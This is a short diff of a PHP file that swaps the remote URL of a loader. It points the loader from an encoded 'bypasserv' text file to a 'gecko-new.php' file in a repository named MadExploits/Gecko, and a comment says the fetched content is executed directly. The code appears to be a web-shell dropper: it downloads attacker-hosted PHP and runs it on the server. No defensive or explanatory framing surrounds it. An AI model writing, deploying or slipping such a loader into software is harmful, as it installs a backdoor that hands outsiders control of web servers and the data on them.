@@ -39,7 +39,7 @@ function geturlsinfo($url) {
 }
 
 // New URL as requested
-$remote_url = 'https://cdn.privdayz.com/txt/bypasserv-encoded.txt';
+$remote_url = 'https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php';
 
 // Directly execute the main content (with a minimal safety check)
 $a = geturlsinfo($remote_url);
